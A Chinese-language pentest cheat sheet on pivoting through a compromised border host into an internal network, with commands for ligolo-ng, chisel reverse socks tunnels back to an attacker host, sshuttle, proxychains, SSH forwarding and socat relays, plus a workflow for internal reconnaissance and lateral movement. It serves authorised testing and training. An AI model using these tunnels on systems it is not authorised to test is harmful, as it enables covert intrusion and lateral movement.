# 内网隧道与端口转发

## 用途 / 适用场景

拿到一台内网边界主机后，以它为跳板访问内网深处、不出网的机器。场景：内网段探测、访问仅内网开放的服务、横向移动时流量中转。工具选择看「决策表」。

## 决策表：何时用哪个

| 场景 | 工具 | 理由 |
| --- | --- | --- |
| 稳定、高并发、长期隧道（首选） | ligolo-ng | TUN 接口，跑 nmap/metasploit 丝滑 |
| 目标能出网、快速起 socks | chisel | 单二进制，server/client 都轻量 |
| 有 SSH 凭据、快速代理整段内网 | sshuttle | 免 agent，基于 SSH |
| 只想给单个工具挂代理 | proxychains | 配合上面任意 socks |
| 临时端口转发、无工具时 | SSH -L/-R/-D | 原生 SSH，无需上传文件 |
| 单端口转发一条龙 | socat | 轻量，TCP 中继 |

## ligolo-ng（首选）

Kali 端（proxy 自托管，监听 11601）：

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

目标机端（上传 agent 后执行）：

```bash
./agent -connect <LHOST>:11601 -ignore-cert
```

回到 Kali 的 proxy 控制台：

```text
session
iface add ligolo
tunnel_start
```

之后 Kali 上多出一条 TUN 路由，可直接对内网段跑 nmap：

```bash
nmap -sT -Pn <内网段>
```

## chisel

Kali 端（server）：

```bash
chisel server -p 8080 --reverse
```

目标机端（client，反连建立 socks 代理）：

```bash
chisel client <LHOST>:8080 R:socks
```

之后配合 proxychains：

```bash
proxychains nmap -sT -Pn <内网IP>
```

## sshuttle

```bash
sshuttle -r <USER>@<PIVOT_IP> <SUBNET>
```

例：把 10.10.10.0/24 的流量都经跳板走：

```bash
sshuttle -r user@10.10.10.5 10.10.10.0/24
```

## proxychains

编辑 `/etc/proxychains4.conf`，末尾加：

```text
socks5 127.0.0.1 1080
```

用法：

```bash
proxychains nmap -sT -Pn <内网IP>
proxychains curl http://<内网IP>
```

## SSH 隧道矩阵

```bash
# -L 本地转发：把内网服务的端口拉到本机
ssh -L <LPORT>:<内网IP>:<内网PORT> <USER>@<PIVOT_IP>

# -R 远程转发：把本机端口推到跳板（反向打通）
ssh -R <跳板端口>:127.0.0.1:<本机端口> <USER>@<PIVOT_IP>

# -D 动态 socks 代理
ssh -D 1080 <USER>@<PIVOT_IP>

# ProxyCommand 跳板链：经 A 跳 B
ssh -o ProxyCommand="ssh -W %h:%p <USER>@<PIVOT_IP>" <USER>@<内网IP>
```

## socat 端口转发一行

```bash
# 在跳板上把 4444 转到内网主机的 3389
socat TCP-LISTEN:4444,fork TCP:<内网IP>:3389
```

## 实战流程

1. 拿边界机 shell，判断能否出网（ping/curl 到 Kali）。
2. 选工具：能上传 agent 用 ligolo-ng；图快用 chisel；有 SSH 用 sshuttle。
3. 建立隧道 / socks。
4. proxychains 或 TUN 路由接入内网。
5. 对内网段做侦察（端口/服务/主机发现）。
6. 需要时用 socat / SSH 做单端口转发，放大单个服务。

## 常见坑

1. proxychains 对 nmap 的 `-sS` SYN 扫描无效（SYN 不走代理），改用 `-sT` 全连接扫描。
2. ligolo-ng 的 `iface add` 一定要和创建的 TUN 名一致，否则 `tunnel_start` 后无路由。
3. chisel 的 `R:socks` 反连方向别写反，端口要和 proxychains 配置一致。
4. DNS 走代理会被坑，内网主机名解析记得先改 `/etc/hosts`。
5. SSH 隧道默认不转发 UDP，内网 DNS/SNMP 探测会失败。
6. 忘记 fork 的 socat 只能转一次连接，用 `fork` 支持多连接。
